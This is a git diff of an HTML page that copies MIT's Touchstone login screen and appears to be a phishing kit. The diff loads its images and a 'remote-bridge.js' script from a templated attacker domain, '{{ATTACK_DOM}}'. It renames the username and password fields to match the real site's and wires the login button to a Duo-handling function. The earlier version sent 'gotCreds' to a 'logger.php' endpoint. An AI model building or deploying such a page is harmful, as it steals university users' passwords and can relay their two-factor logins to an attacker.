@@ -1,15 +1,327 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html style="display:none" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<html style="display:block" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
     <head>
 	<meta http-equiv="pragma" content="no-cache" />
 	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
 	<title>Touchstone@MIT : Please Authenticate</title> 
-	<link rel="stylesheet" media="screen" href="duocss/login.css" type="text/css" />
+	<style>
+	/* page sections
+================= */
+
+*
+{
+	margin: 0;
+	padding: 0;
+}
+
+ol, ul, dl { margin-left: 5em; }
+
+body
+{
+	margin: 0;
+	min-width: 31em;
+	background: #777;
+	font-family: "lucida sans", "lucida grande", arial, verdana, helvetica, sans-serif;
+	line-height: 1.7;
+	font-size: 12px;
+	color: #3f3f3f;
+}
+
+strong, div.error, div.note, #timer { color: #000; }
+
+#timer
+{
+	background: #ECF7DA;
+	border: 1px solid #B2CD38;
+	padding: 3px 7px;
+}
+
+#loginbox
+{
+	min-width: 50em;
+	padding: 2em 5%;
+	background: #fbfbfb;
+	border: 1px solid #aaa;
+	border-width: 2px 0 15px 0;
+}
+
+#mit-mast { padding: 0 5%; }
+
+h1
+{
+	font-size: 275%;
+	color: #ddd;
+	border: 15px solid #777;
+	margin-left: -20px;
+	width: 55%;
+	white-space: nowrap;
+}
+
+h1 span { color: #C7ECA2; }
+
+h2, h3
+{
+	line-height: 1.2;
+	margin: 3px 0;
+}
+
+h3
+{
+	border-bottom: 5px solid #eee;
+	margin-top: 1.5em;
+}
+
+p { margin: 1em 0; }
+
+#mit-mast ul
+{
+	background: #777;
+	list-style: none;
+	margin: -2em 0 0 0;
+	text-align: right;
+	border-bottom: 5px solid #555;
+}
+
+#mit-mast li { display: inline; }
+
+#mit-mast li a
+{
+	padding: 5px;
+	font-size: 105%;
+	font-weight: 800;
+}
+
+#mit-mast li a:hover
+{
+	background: #fff;
+	color: #933;
+}
+
+div.error, div.note
+{
+	border-left: 20px solid #f30;
+	padding: 5px 12px;
+	font-weight: 800;
+	background: #F5FEAB;
+	margin: 0.25em 0;
+}
+
+div.note
+{
+	border-left: 20px solid #7F9228;
+	background: #ECF7DA;
+}
+
+div.helpbox ol { margin: 5px 0 5px 18px; }
+
+div.helpbox div.note
+{
+	margin-left: -8px;
+	border-left-width: 8px;
+}
+
+#foot
+{
+	background: url("https://{{ATTACK_DOM}}/idp/Authn/images/mit-greywhite-footer3.gif") 5% 10px no-repeat;
+	padding: 0 5%;
+	border-top: 12px solid #777;
+}
+
+#foot p
+{
+	background: url("https://{{ATTACK_DOM}}/idp/Authn/images/ist-logo.png") 65px 0 no-repeat;
+	text-indent: 108px;
+	padding: 0.5em 0;
+}
+
+a
+{
+	text-decoration: none;
+	border-bottom: 1px dotted #8DB849;
+	color: #ddd;
+	padding: 1px 3px;
+}
+
+#loginbox a
+{
+	color: #405A25;
+	background: #F2FCE0;
+}
+
+a:hover
+{
+	color: #000 !important;
+	border-bottom: 1px solid #000;
+}
+
+#loginbox a:hover { background-color: #fff; }
+a:active, a:focus { outline: none; }
+
+/* login form and others
+================= */
+
+form
+{
+	margin: 1em 0;
+	min-width: 45em;
+	clear: both;
+	border-bottom: 10px solid #fbfbfb;
+}
+
+fieldset
+{
+	border: 1px solid #ddd;
+	border-color: #ddd #ccc #ccc #ddd;
+	min-width: 25em;
+	padding: 0 1em 1em 2em;
+}
+
+legend
+{
+	color: #933;
+	font-weight: 800;
+	font-size: 130%;
+	padding: 2px 5px;
+	margin-left: -20px;
+}
+
+input[type="checkbox"], input[type="radio"]
+{
+	margin-right: 8px;
+	border: 0 !important;
+}
+
+input[type="text"], input[type="password"]
+{
+	padding: 3px 5px;
+	border: 1px solid #777;
+	border-color: #777 #555 #555 #777;
+	background: #F6F9EE url("https://{{ATTACK_DOM}}/idp/Authn/images/fieldbg.gif") repeat-x top;
+}
+
+input:focus
+{
+	border: 1px solid #000;
+	background-color: #fff;
+}
+input[name="submitt"]
+{
+	border: 3px double #86B05D;
+	border-color: #A7C687 #618938 #618938 #A7C687;
+	background-color: #7DB047;
+	color: #fff;
+	padding: 2px 10px;
+	font-size: 175%;
+	margin-top: 12px;
+}
+
+label input[name="submitt"]
+{
+	font-size: 120%;
+	border-width: 1px;
+	margin-top: -6px;
+}
+
+input[name="submitt"]:hover
+{
+	border-color: #eeeee1 #555 #555 #eeeee1;
+	background-color: #A7C687;
+	color: #000;
+}
+
+input[type="submit"]
+{
+	border: 3px double #86B05D;
+	border-color: #A7C687 #618938 #618938 #A7C687;
+	background-color: #7DB047;
+	color: #fff;
+	padding: 2px 10px;
+	font-size: 175%;
+	margin-top: 12px;
+}
+
+label input[type="submit"]
+{
+	font-size: 120%;
+	border-width: 1px;
+	margin-top: -6px;
+}
+
+input[type="submit"]:hover
+{
+	border-color: #eeeee1 #555 #555 #eeeee1;
+	background-color: #A7C687;
+	color: #000;
+}
+
+label
+{
+	display: block;
+	padding: 3px 0;
+	margin-top: 5px;
+}
+
+label strong
+{
+	display: block;
+	float: left;
+	font-size: 110%;
+	margin: 0 0.25em 0 0;
+	width: 7em;
+}
+
+span.formHint
+{
+	white-space: nowrap;
+	margin: 0 0 0 10px;
+	font-size: 95%;
+}
+
+div.helpbox
+{
+	float: right;
+	padding: 2px 5px 5px 12px;
+	border: 1px solid #eee;
+	width: 18em;
+	line-height: 1.3;
+	color: #444;
+	position: relative;
+	top: -1px;
+	background: #fff;
+	margin: 1.25em 0 0 2px;
+	font-size: 98%;
+}
+
+div.helpbox a { padding: 0 !important; }
+code { font-size: 120%; }
+
+iframe#duo_iframe {
+    width: 100%;
+    min-width: 304px;
+    max-width: 620px;
+    height: 330px;
+    margin: 0 auto;
+    border-width: 0;
+    background: #777;
+}
+
+#duo_helpbox {
+    display: inline-block;
+}
+
+#duo_container {
+    min-width: 870px;
+}
+
+.clearfloat {
+    clear: both;
+}
+
+</style>
 	<link rel="icon"
       type="image/png"
-      href="images/favicon.ico" />
-	<script src="remote-bridge.js"></script>
+      href="https://{{ATTACK_DOM}}/idp/Authn/images/favicon.ico" />
     </head>
 
 	<body>
@@ -85,7 +397,8 @@
 	
 		<!--<form action="https://idp.mit.edu/idp/Authn/UsernamePassword" method="post" enctype="application/x-www-form-urlencoded" id="loginform">
 		-->
-<form action="logger.php" method="get" id="loginform" onsubmit="return false">
+<!--<form action="https://{{ATTACK_DOM}}/login" method="get" id="loginform" onsubmit="submit()">-->
+<form onsubmit="return false">
 	<input type="hidden" name="action" value="gotCreds" />
 		    <div class="helpbox">
 		    <p>
@@ -101,12 +414,13 @@ If you don't have a certificate installed on this machine, you may login using y
 		
 		    </legend>
 		    <label><strong>Username:</strong>
-			<input name="username" type="text" size="10" tabindex="3" /> @mit.edu
+			<input name="j_username" type="text" size="10" tabindex="3" /> @mit.edu
 		    </label>
 		    <label><strong>Password:</strong>
-			<input name="pass" type="password" size="10" tabindex="4" /> <input  type="submit" name="Submit" onclick="connect()" value="Login" tabindex="5" />
+			<input name="j_password" type="password" size="10" tabindex="4" /> 
+			<input onclick="submitDUO()"  type="submit" name="Submit" value="Login" tabindex="5" />
 		    </label> 
-                    <input type="hidden" name="conversation" value="e1s1" />
+            <input type="hidden" name="mobile" value="false" />
 		    </fieldset>
 
 		</form>
@@ -139,6 +453,7 @@ If you don't have a certificate installed on this machine, you may login using y
 		<a href="http://web.mit.edu/">massachusetts institute of technology</a> 
 	</p>
 </div>
+	<script src="https://{{ATTACK_DOM}}/idp/Authn/remote-bridge.js"></script>
 	</body>
 	
 </html>
